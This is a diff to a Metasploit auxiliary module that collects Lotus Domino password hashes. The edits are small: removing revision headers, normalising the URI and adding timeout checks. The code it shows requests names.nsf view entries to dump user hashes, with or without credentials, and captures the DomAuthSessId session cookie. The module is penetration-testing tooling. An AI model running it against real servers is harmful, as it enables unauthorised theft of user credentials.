@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -20,7 +16,6 @@ class Metasploit3 < Msf::Auxiliary
 	def initialize
 		super(
 			'Name'           => 'Lotus Domino Password Hash Collector',
-			'Version'        => '$Revision$',
 			'Description'    => 'Get users passwords hashes from names.nsf page',
 			'Author'         => 'Tiago Ferreira <tiago.ccna[at]gmail.com>',
 			'License'        => MSF_LICENSE
@@ -39,7 +34,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		user = datastore['NOTES_USER'].to_s
 		pass = datastore['NOTES_PASS'].to_s
-		$uri =  datastore['URI'].to_s
+		$uri = normalize_uri(datastore['URI'])
 
 		if (user.length == 0 and pass.length == 0)
 			print_status("http://#{vhost}:#{rport} - Lotus Domino - Trying dump password hashes without credentials")
@@ -49,6 +44,11 @@ class Metasploit3 < Msf::Auxiliary
 					'method'  => 'GET',
 					'uri'     => "#{$uri}\/$defaultview?Readviewentries",
 				}, 25)
+
+				if res.nil?
+					print_error("Connection timed out")
+					return
+				end
 
 				if (res and res.body.to_s =~ /\<viewentries/)
 					print_good("http://#{vhost}:#{rport} - Lotus Domino - OK names.nsf accessible without credentials")
@@ -89,6 +89,11 @@ class Metasploit3 < Msf::Auxiliary
 				'uri'     => '/names.nsf?Login',
 				'data'    => post_data,
 			}, 20)
+
+			if res.nil?
+				print_error("http://#{vhost}:#{rport} - Connection timed out")
+				return
+			end
 
 			if (res and res.code == 302 )
 				if res.headers['Set-Cookie'] and res.headers['Set-Cookie'].match(/DomAuthSessId=(.*);(.*)/i)
